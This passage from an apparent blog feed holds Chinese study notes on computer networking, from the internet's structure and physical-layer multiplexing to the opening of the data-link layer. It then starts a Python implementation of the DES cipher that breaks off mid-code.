        <content type="html"><![CDATA[<center><h1>计算机网络</h1></center>[TOC]<h2 id="第1章-概述"><a href="#第1章-概述" class="headerlink" title="第1章  概述"></a>第1章  概述</h2><h3 id="1-1-计算机网络在信息时代中的作用"><a href="#1-1-计算机网络在信息时代中的作用" class="headerlink" title="1.1 计算机网络在信息时代中的作用"></a>1.1 计算机网络在信息时代中的作用</h3><p>21世纪的一些重要特征：数字化、网络化和信息化，它是一个以网络为核心的信息时代。</p><h3 id="1-2-因特网概述"><a href="#1-2-因特网概述" class="headerlink" title="1.2 因特网概述"></a>1.2 因特网概述</h3><p>因特网现已发展成为世界上最大的国际性计算机互联网，网络(network)由若干结点(node)和连接这些结点的链路(link)组成。 互联网是“网络的网络”(network of networks)。 连接在因特网上的计算机都称为主机(host)网络把许多计算机连接在一起。因特网把许多网络连接在一起。</p><p><strong>因特网发展的三个阶段</strong></p><p>1、第一阶段：从单个网络 ARPANET 向互联网发展</p><blockquote><p>1968年，ARPANET<br>1983 年 TCP/IP 协议成为 ARPANET 上的标准协议<br>internet 和 Internet 的区别 以小写字母 i 开始的 internet是一个通用名词，它泛指由多个计算机网络互连而成的网络。<br>以大写字母I开始的的Internet是一个专用名词，它指当前全球最大的、开放的、由众多网络相互连接而成的特定计算机网络，采用 TCP/IP 协议族作为通信的规则，前身是ARPANET。</p></blockquote><p>2、第二阶段：三级结构的因特网</p><p>三级计算机网络，分为主干网、地区网和校园网<br>3、第三阶段：多层次 ISP 结构的因特网</p><h3 id="1-3-因特网的组成"><a href="#1-3-因特网的组成" class="headerlink" title="1.3  因特网的组成"></a>1.3  因特网的组成</h3><pre class="line-numbers language-none"><code class="language-none">拓扑划分边缘部分:由所有连接在因特网上的主机组成。这部分是用户直接使用的，用来进行通信和资源共享。核心部分:由大量网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的（提供连通性和交换）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-3-1因特网的边缘部分"><a href="#1-3-1因特网的边缘部分" class="headerlink" title="1.3.1因特网的边缘部分:"></a>1.3.1因特网的边缘部分:</h4><p>处在因特网边缘的部分就是连接在因特网上的所有的主机。这些主机又称为端系统(end system)。<br> “主机 A 和主机 B 进行通信”，实际上是指：“运行在主机 A 上的某个程序和运行在主机 B 上的另一个程序进行通信”。<br>即“主机 A 的某个进程和主机 B 上的另一个进程进行通信”。或简称为“计算机之间通信” </p><p><strong>边缘部分的两种通信方式</strong></p><p><strong>客户服务器方式（ Client/Server ，C/S ）</strong><br>客户(client)和服务器(server)都是指通信中所涉及的两个应用进程，客户服务器方式所描述的是进程之间服务和被服务的关系。客户是服务的请求方，服务器是服务的提供方。</p><p><strong>对等方式（ Peer-to-Peer ，P2P）</strong></p><p>对等连接(peer-to-peer，简写为 P2P)是指两个主机在通信时并不区分哪一个是服务请求方还是服务提供方。<br>只要两个主机都运行了对等连接软件（P2P 软件），它们就可以进行平等的、对等连接通信。<br>双方都可以下载对方已经存储在硬盘中的共享文档。<br>对等连接方式从本质上看仍然是使用客户服务器方式，只是对等连接中的每一个主机既是客户又同时是服务器。</p><h4 id="1-3-2-因特网的核心部分"><a href="#1-3-2-因特网的核心部分" class="headerlink" title="1.3.2  因特网的核心部分"></a>1.3.2  因特网的核心部分</h4><p>1、概述<br>网络核心部分是因特网中最复杂的部分。网络中的核心部分要向网络边缘中的大量主机提供连通性，在网络核心部分起特殊作用的是路由器。路由器是实现分组交换(packet switching)的关键构件</p><p>2、路由器的重要任务</p><p>实现分组交换(packet switching)转发分组（网络核心最重要功能）</p><p>3、三种交换方式<br>电路交换</p><p>电路交换的特点：面向连接<br>电路交换的三个阶段：建立连接、通信、释放连接<br>缺点：线路占用、通信线路的利用率很低</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.png" style="zoom:50%;" /><p>分组交换带来的问题：排队，造成时延，分组必须携带的首部（控制信息）也造成一定的开销</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.png" style="zoom:50%;" /><h3 id="1-4-计算机网络在我国的发展"><a href="#1-4-计算机网络在我国的发展" class="headerlink" title="1.4 计算机网络在我国的发展"></a>1.4 计算机网络在我国的发展</h3><h3 id="1-5-计算机网络的分类"><a href="#1-5-计算机网络的分类" class="headerlink" title="1.5 计算机网络的分类"></a>1.5 计算机网络的分类</h3><h4 id="1-5-1-计算机网络的不同定义"><a href="#1-5-1-计算机网络的不同定义" class="headerlink" title="1.5.1  计算机网络的不同定义"></a>1.5.1  计算机网络的不同定义</h4><p>1、计算机网络的定义:<br>网络的最简单的定义是：一些互相连接的、自治的计算机的集合。<br>其他文献：一个计算机网络应当有三个主要组成部分：若干个主机；一个通信子网；一系列协议。<br>中科院王英彬：<strong>把分布在不同地理位置的独立自主的计算机系统用通信线路连接起来，在通信协议的控制下实现资源共享的新型计算机系统。</strong></p><p>2、网络实例<br>最简单的计算机网络就只有两台计算机和连接它们的一条链路。<br>最复杂的计算机网络就是因特网。它由非常多的计算机网络通过许多路由器互连而成。因此因特网也称为“网络的网络”(network of networks)。</p><h4 id="1-5-2-几种不同类别的网络"><a href="#1-5-2-几种不同类别的网络" class="headerlink" title="1.5.2 几种不同类别的网络"></a>1.5.2 几种不同类别的网络</h4><blockquote><p>1．从网络的交换功能进行分类:电路交换,报文交换,分组交换,混合交换<br>2．从网络的拓扑结构进行分类:总线型,树型,星型,环型<br>3．从网络的作用范围进行分类广域网WAN 局域网LAN 城域网MAN接入网AN<br>4．从网络的使用范围进行分类:公用网和专用网</p></blockquote><h3 id="1-6-计算机网络的性能"><a href="#1-6-计算机网络的性能" class="headerlink" title="1.6 计算机网络的性能"></a>1.6 计算机网络的性能</h3><h4 id="1-6-1-计算机网络的性能指标"><a href="#1-6-1-计算机网络的性能指标" class="headerlink" title="1.6.1  计算机网络的性能指标"></a>1.6.1  计算机网络的性能指标</h4><p><strong>速率  ：</strong>比特:数据量的单位，也是信息论中使用的信息量的单位,一个比特就是二进制数字中的一个 1 或 0<br>速率：数据率或比特率，单位是 b/s，或kb/s, Mb/s, Gb/s 等</p><p><strong>带宽 ：</strong>信号的频带宽度，单位是赫。现在“带宽”：数字信道所能传送的“最高数据率” ，单位是“比特每秒”，或 b/s (bit/s)。</p><p>**吞吐量 :**吞吐量(throughput)：单位时间内通过某个网络的数据量，吞吐量受网络的带宽或网络的额定速率的限制。  </p><p><strong>时延:</strong></p><p>1.传输时延: 发送数据时，数据块从结点进入到传输媒体所需要的时间,也就是从发送数据帧的第一个比特算起，到该帧的最后一个比特发送完毕所需的时间。 </p><p>2.传播时延:电磁波在信道中需要传播一定的距离而花费的时间, 信号传输速率（即发送速率）和信号在信道上的传播速率是完全不同的概念。 </p><p>3.处理时延:交换结点为存储转发而进行一些必要的处理所花费的时间。</p><p>4.排队时延: 结点缓存队列中分组排队所经历的时延，排队时延的长短往往取决于网络中当时的通信量。</p><p>5.总时延: 数据经历的总时延就是发送时延、传播时延、处理时延和排队时延之和</p><p>对于高速网络链路，我们提高的仅仅是数据的发送速率而不是比特在链路上的传播速率，提高链路带宽减小了数据的发送时延。 </p><p><strong>利用率:</strong> 信道利用率指某信道有百分之几的时间是被利用的，网络利用率则是全网络的信道利用率的加权平均值。</p><blockquote><p>信道利用率并非越高越好。 </p></blockquote><p><strong>时延与网络利用率的关系：</strong></p><p>根据排队论的理论，当某信道的利用率增大时，该信道引起的时延也就迅速增加。<br>若令 D0 表示网络空闲时的时延，D 表示网络当前的时延，则在适当的假定条件下，可以用下面的简单公式表示 D 和 D0之间的关系： <img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.png" style="zoom: 33%;"/></p><p>U 是网络的利用率，数值在 0 到 1 之间。 </p><h3 id="1-7-计算机网络的体系结构"><a href="#1-7-计算机网络的体系结构" class="headerlink" title="1.7  计算机网络的体系结构"></a>1.7  计算机网络的体系结构</h3><p>1、计算机网络的体系结构<br>定义：计算机网络的各层及其协议的集合。<br>实现(implementation)是遵循这种体系结构的前提下用何种硬件或软件完成这些功能的问题。</p><p>2、网络协议的组成要素 </p><p>语法： 数据与控制信息的结构或格式 。<br>语义：  需要发出何种控制信息，完成何种动作以及做出何种响应。<br>同步：   事件实现顺序的详细说明。 </p><p>3、TCP/IP四层结构与OSI七层结构</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.png" style="zoom:50%;" align ="left"/><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.png" style="zoom:50%; " align ="left"/>应用层：与用户最接近的一层<br>表示层：通用的数据格式，语法<br>会话层：控制会话<br>传输层：流控、保证可靠性<br>网络层：路径选择<br>数据链路层：帧、介质访问控制<br>物理层：规定信号和介质</p><p>4、实体、协议、服务和服务访问点 </p><p>1、基本概念</p><p>实体：任何可发送或接收信息的硬件或软件进程。<br>协议：控制两个对等实体进行通信的规则的集合。<br>在协议的控制下，本层向上一层提供服务，要实现本层协议，还需使用下层所提供的服务。 </p><p>本层的服务只能看见服务而无法看见下面的协议，下面的协议对上面的服务用户是透明的。 协议是“水平的”，即协议是控制对等实体之间通信的规则。服务是“垂直的”，即服务是由下层向上层通过层间接口提供的。同一系统相邻两层的实体进行交互的地方，称为服务访问点 SAP (Service Access Point)。  </p><h2 id="第2章-物-理-层"><a href="#第2章-物-理-层" class="headerlink" title="第2章  物 理 层"></a>第2章  物 理 层</h2><h3 id="2-1-物理层的基本概念"><a href="#2-1-物理层的基本概念" class="headerlink" title="2.1 物理层的基本概念"></a>2.1 物理层的基本概念</h3><p>1、规程：用于物理层的协议称为物理层规程(procedure)。<br>2、物理层的主要任务：确定与传输媒体的接口的一些特性，即：机械特性，电气特性，功能特性，规程特性。<br>3、串行传输与并行传输方式</p><h3 id="2-2-数据通信的基础知识"><a href="#2-2-数据通信的基础知识" class="headerlink" title="2.2 数据通信的基础知识"></a>2.2 数据通信的基础知识</h3><h4 id="2-2-1-数据通信系统的模型"><a href="#2-2-1-数据通信系统的模型" class="headerlink" title="2.2.1  数据通信系统的模型"></a>2.2.1  数据通信系统的模型</h4><blockquote><p>数据(data)：运送信息的实体<br>信号(signal)：数据的电气的或电磁的表现<br>模拟的信号：是连续变化的信号<br>数字的信号：表示取值是离散<br>码元(code):在使用时间域（或简称为时域）的波形表示数字信号时，代表不同离散数值的基本波形。<br>调制：将数字数据转换为模拟信号的过程<br>解调：将模拟信号转换为数字信号的过程</p></blockquote><h4 id="2-2-2-有关信道的几个基本概念"><a href="#2-2-2-有关信道的几个基本概念" class="headerlink" title="2.2.2  有关信道的几个基本概念"></a>2.2.2  有关信道的几个基本概念</h4><p>1、信道定义：用来表示向某一方向传送信息的媒体<br>2、通信的三种基本方式。</p><ol><li>单向通信：又称为单工通信，即只能有一个方向的通信而没有反方向的交互</li><li>双向交替通信：又称为半双工通信，即通信的双方都可以发送信息，但不能双方同时发送</li><li>双向同时通信：又称为全双工通信，即通信的双方可以同时发送和接收信息。</li></ol><p>3、基带(baseband)信号和带通(band pass)信号 </p><ol><li>基带信号：来自信源的信号。如计算机输出的信号</li><li>带通信号：把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输</li></ol><p>4、几种最基本的调制方法</p><ol><li>实行调制的原因<pre><code>  基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。</code></pre></li><li>最基本的二元制调制方法<br>调幅(AM)：载波的振幅随基带数字信号而变化。<br>调频(FM)：载波的频率随基带数字信号而变化。<br>调相(PM) ：载波的初始相位随基带数字信号而变化。</li></ol><p>5、正交振幅调制 QAM(Quadrature Amplitude Modulation)<br> 注：若每一个码元可表示的比特数越多，则在接收端进行，解调时要正确识别每一种状态就越困难。 </p><h4 id="2-2-3-信道的极限容量"><a href="#2-2-3-信道的极限容量" class="headerlink" title="2.2.3  信道的极限容量"></a>2.2.3  信道的极限容量</h4><p>1、非理想信道特点</p><p>任何实际的信道都不是理想的，在传输信号时会产生各种失真以及干扰。<br>码元传输的速率越高，或信号传输的距离越远，信道的输出端的波形的失真越严重。</p><p>2、数字信号通过实际的信道</p><p>3、奈氏准则：</p><pre class="line-numbers language-none"><code class="language-none">理想低通信道的最高码元传输速率 &#x3D; 2W Baud 理想带通信道的最高码元传输速率 &#x3D; W Baud<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-3-物理层下面的传输媒体"><a href="#2-3-物理层下面的传输媒体" class="headerlink" title="2.3 物理层下面的传输媒体"></a>2.3 物理层下面的传输媒体</h3><p>传输媒体也称为传输介质或传输媒介，它就是数据传输系统中在发送器和接收器之间的物理通路。<br>在导向传输媒体中，电磁波被导向沿着固体媒体(铜线或光纤)传播<br>非导向传输媒体就是指自由空间，在非导向传输媒体中电磁波的传输常称为无线传输。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/6.png" alt="" style="zoom:50%;" /><h4 id="2-3-1-导向传输媒体"><a href="#2-3-1-导向传输媒体" class="headerlink" title="2.3.1  导向传输媒体"></a>2.3.1  导向传输媒体</h4><p>1．双绞线<br>把两根互相绝缘的铜导线并排放在一起，然后用规则的方法绞合(twist)起来就构成了双绞线。</p><p>可以分为:屏蔽双绞线和无屏蔽双绞线</p><p>2．同轴电缆<br>结构：<br>同轴电缆由内导体铜质芯线(单股实心线或多股绞合线)、绝缘层、网状编织的外导体屏蔽层(也可以是单股的)以及保护塑料外层所组成</p><p>分类：<br>(1)50Ω同轴电缆<br>又称为基带同轴电缆，传输基带数字信号常用的两种编码方法<br>(2) 75 Ω同轴电缆又称为宽带同轴电缆。<br>“宽带系统”是指采用了频分复用和模拟传输技术的同轴电缆网络</p><p>光缆：光纤通常由非常透明的石英玻璃拉成细丝，主要由纤芯和包层构成双层通信圆柱体。纤芯很细，其直径只有8 ~ 100 。正是这个纤芯用来传导光波。</p><h4 id="2-3-2-非导向传输媒体"><a href="#2-3-2-非导向传输媒体" class="headerlink" title="2.3.2  非导向传输媒体"></a>2.3.2  非导向传输媒体</h4><p>1．无线传输：使用的频段很广<br>2、短波：主要是靠电离层的反射，但短波信道的通信质量较差。</p><h3 id="2-4-信道复用技术"><a href="#2-4-信道复用技术" class="headerlink" title="2.4 信道复用技术"></a>2.4 信道复用技术</h3><h4 id="2-4-1-频分复用、时分复用和统计时分复用"><a href="#2-4-1-频分复用、时分复用和统计时分复用" class="headerlink" title="2.4.1  频分复用、时分复用和统计时分复用"></a>2.4.1  频分复用、时分复用和统计时分复用</h4><p>1、复用(multiplexing) </p><p>2、频分复用 FDM(Frequency Division Multiplexing) </p><p>1、含义<br>用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带，频分复用的所有用户在同样的时间占用不同的带宽资源</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/7.png" style="zoom:80%;" /><p>3、时分复用TDM(Time Division Multiplexing)<br>时分复用则是将时间划分为一段段等长的时分复用帧。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。每一个用户所占用的时隙是周期性地出现。TDM 信号也称为等时信号。<br>时分复用的所有用户是在不同的时间占用同样的频带宽度。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/8.png" style="zoom:80%;" /><p>2、时分复用可能会造成线路资源的浪费 </p><p>由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的。 </p><p>3、统计时分复用 STDM(Statistic TDM)  </p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/9.png" style="zoom: 50%;" /><h4 id="2-4-2-波分复用-WDM"><a href="#2-4-2-波分复用-WDM" class="headerlink" title="2.4.2   波分复用 WDM"></a>2.4.2   波分复用 WDM</h4><p>1、含义：波分复用就是光的频分复用。 </p><h4 id="2-4-3-码分复用-CDM-Code-Division-Multiplexing"><a href="#2-4-3-码分复用-CDM-Code-Division-Multiplexing" class="headerlink" title="2.4.3 码分复用 CDM(Code Division Multiplexing)"></a>2.4.3 码分复用 CDM(Code Division Multiplexing)</h4><p>1、常用的名词<br>码分多址 CDMA(Code Division Multiple Access)：<br>各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。 每一个比特时间划分为 m 个短的间隔，称为码片(chip)</p><p>2、CDMA 的重要特点</p><p>每个站分配的码片序列不仅必须各不相同，并且还必须互相正交(orthogonal)。在实用的系统中是使用伪随机码序列。 </p><p>3、码片序列的正交关系 </p><p>令向量 S 表示站 S 的码片向量，令 T 表示其他任何站的码片向量。<br>两个不同站的码片序列正交，就是向量 S 和T 的规格化内积(inner product)都是 0： <img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/10.png" style="zoom: 50%;" /></p><p>5、正交关系的另一个重要特性 </p><p>任何一个码片向量和该码片向量自己的规格化内积都是1 。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/11.png" alt="" style="zoom:50%;" /><p>一个码片向量和该码片反码的向量的规格化内积值是 –1。 </p><p>6、CDMA通信过程<br>设有一个X站要接收S站发送的数据，X站就必须知道S站所有的码片序列，X站使用它得到的码片向量S与接收到的未知信号进行求内积的运算。X站接收到的信号是各个站发送的码片序列之和。根据叠加定理，那么求内积得到的结果是：所以其它站的信号都被过虑掉（其内积的相关项都是0），而只剩下S站发送的信号。当S站发送比特1时，在X站计算内积的结果是＋1，当S站发送比特0时，内积结果时－1。</p><h3 id="2-5-数字传输系统"><a href="#2-5-数字传输系统" class="headerlink" title="2.5 数字传输系统"></a>2.5 数字传输系统</h3><p>脉码调制 PCM 体制</p><p>电话局之间的中继线上传送多路的电话<br>两个互不兼容的国际标准: 北美的 24 路 PCM（简称为 T1）和欧洲的 30 路 PCM（简称为 E1）<br>E1 的速率是 2.048 Mb/s，而 T1 的速率是 1.544 Mb/s。<br>当需要有更高的数据率时，可采用复用的方法。</p><ol start="2"><li>同步光纤网 SONET 和同步数字系列 SDH</li></ol><p>  旧数字系统的缺点：（1）速率标准不统一（2）不是同步传输<br>  同步光纤网 SONET：</p><p>  同步光纤网 SONET的各级时钟都来自一个非常精确的主时钟。 第 1 级同步传送信号 STS-1 (Synchronous Transport Signal)的传输速率是 51.84 Mb/s，光信号则称为第 1 级光载波 OC-1，OC 表示Optical Carrier。  </p><ol start="3"><li>同步数字系列 SDH<br>  ITU-T 以美国标准 SONET 为基础，制订出国际标准同步数字系列 SDH (Synchronous Digital Hierarchy)。<br>  一般可认为 SDH 与 SONET 是同义词。<br>  SDH 的基本速率为 155.52 Mb/s，称为第 1 级同步传递模块 (Synchronous Transfer Module)，即 STM-1，相当于 SONET 体系中的 OC-3 速率。</li></ol><h3 id="2-6-宽带接入技术"><a href="#2-6-宽带接入技术" class="headerlink" title="2.6 宽带接入技术"></a>2.6 宽带接入技术</h3><h4 id="2-6-1-xDSL技术"><a href="#2-6-1-xDSL技术" class="headerlink" title="2.6.1  xDSL技术"></a>2.6.1  xDSL技术</h4><p>1、概述<br>xDSL 技术就是用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务。<br>标准模拟电话信号的频带被限制在 300<del>3400 kHz 的范围内，但用户线本身实际可通过的信号频率仍然超过 1 MHz。<br>xDSL 技术就把 0</del>4 kHz 低端频谱留给传统电话使用，而把原来没有被利用的高端频谱留给用户上网使用。<br>DSL 就是数字用户线(Digital Subscriber Line)的缩写。而 DSL 的前缀 x 则表示在数字用户线上实现的不同宽带方案。 </p><h4 id="2-6-2-光纤同轴混合网HFC-Hybrid-Fiber-Coax"><a href="#2-6-2-光纤同轴混合网HFC-Hybrid-Fiber-Coax" class="headerlink" title="2.6.2  光纤同轴混合网HFC (Hybrid Fiber Coax)"></a>2.6.2  光纤同轴混合网HFC (Hybrid Fiber Coax)</h4><p>HFC 网是在目前覆盖面很广的有线电视网 CATV 的基础上开发的一种居民宽带接入网。<br>HFC 网除可传送 CATV 外，还提供电话、数据和其他宽带交互型业务。<br>现有的 CATV 网是树形拓扑结构的同轴电缆网络，它采用模拟技术的频分复用对电视节目进行单向传输。而 HFC 网则需要对 CATV 网进行改造，  </p><h2 id="第3章-数据链路层"><a href="#第3章-数据链路层" class="headerlink" title="第3章  数据链路层"></a>第3章  数据链路层</h2><h3 id="3-0-引言"><a href="#3-0-引言" class="headerlink" title="3.0  引言"></a>3.0  引言</h3><p>1、数据链路层使用的信道类型：</p><ol><li>点对点信道：这种信道使用一对一的点对点通信方式</li><li>广播信道：这种信道使用一对多的广播通信方式，广播信道上连接的主机很多，使用专用的共享信道协议</li></ol><p>2、数据链路层的简单模型：</p><img src="D:\gitee-blog\source\_posts\计算机网络\12.png" style="zoom:50%;" /><p>从层次上来看数据的流动：</p><img src="D:\gitee-blog\source\_posts\计算机网络\13.png" style="zoom:50%;" /><h3 id="3-1-使用点对点信道的数据链路层"><a href="#3-1-使用点对点信道的数据链路层" class="headerlink" title="3.1  使用点对点信道的数据链路层"></a>3.1  使用点对点信道的数据链路层</h3><p>1、链路<br>链路(link)：一条无源的点到点的物理线路段，中间没有任何其他的交换结点，一条链路只是一条通路的一个组成部分。<br>数据链路(data link)：协议的硬件和软件加到链路上，就构成了数据链路。</p><p>2、帧</p><h4 id="3-1-2-三个基本问题"><a href="#3-1-2-三个基本问题" class="headerlink" title="3.1.2  三个基本问题"></a>3.1.2  三个基本问题</h4><p>1、 封装成帧</p><p>封装成帧：在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。</p><p>2、 透明传输<br>3、 差错控制 </p><h3 id="3-2-点对点协议-PPP"><a href="#3-2-点对点协议-PPP" class="headerlink" title="3.2  点对点协议 PPP"></a>3.2  点对点协议 PPP</h3><h3 id="3-3-使用广播信道的数据链路层"><a href="#3-3-使用广播信道的数据链路层" class="headerlink" title="3.3  使用广播信道的数据链路层"></a>3.3  使用广播信道的数据链路层</h3><h3 id="3-4-扩展的以太网"><a href="#3-4-扩展的以太网" class="headerlink" title="3.4  扩展的以太网"></a>3.4  扩展的以太网</h3><h3 id="3-5-高速以太网"><a href="#3-5-高速以太网" class="headerlink" title="3.5 高速以太网"></a>3.5 高速以太网</h3>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES算法的python实现</title>
      <link href="/2022/04/09/DES%E7%AE%97%E6%B3%95%E7%9A%84python%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/04/09/DES%E7%AE%97%E6%B3%95%E7%9A%84python%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>先上代码吧：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">my_read</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 读取各种矩阵----参数为文件名和目标矩阵的行列数</span>    sz <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> s1<span class="token punctuation">:</span>        lists <span class="token operator">=</span> s1<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>            <span class="token comment"># 以 , 将字符串分开</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sz<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                sz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>    <span class="token keyword">return</span> sz    <span class="token comment"># 返回一个该矩阵的二维数组</span><span class="token keyword">def</span> <span class="token function">ord_bin</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">:</span>    str1_hex <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>        str1_hex <span class="token operator">=</span> str1_hex <span class="token operator">+</span> <span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> str1_hex<span class="token keyword">def</span> <span class="token function">create_L0R0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#生成L0,R0</span>    mingwen<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    MW<span class="token operator">=</span><span class="token string">"abcdefgh"</span>    str1_hex<span class="token operator">=</span>ord_bin<span class="token punctuation">(</span>MW<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            mingwen<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>str1_hex<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>j<span class="token punctuation">]</span>    rep <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"IP.txt"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment">#读取置换矩阵</span>    rep_mingwen <span class="token operator">=</span> replace<span class="token punctuation">(</span>mingwen<span class="token punctuation">,</span>rep<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment">#进行初始置换</span>    L0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    R0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#得到c0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x<span class="token punctuation">,</span>y <span class="token operator">=</span> get_xy<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 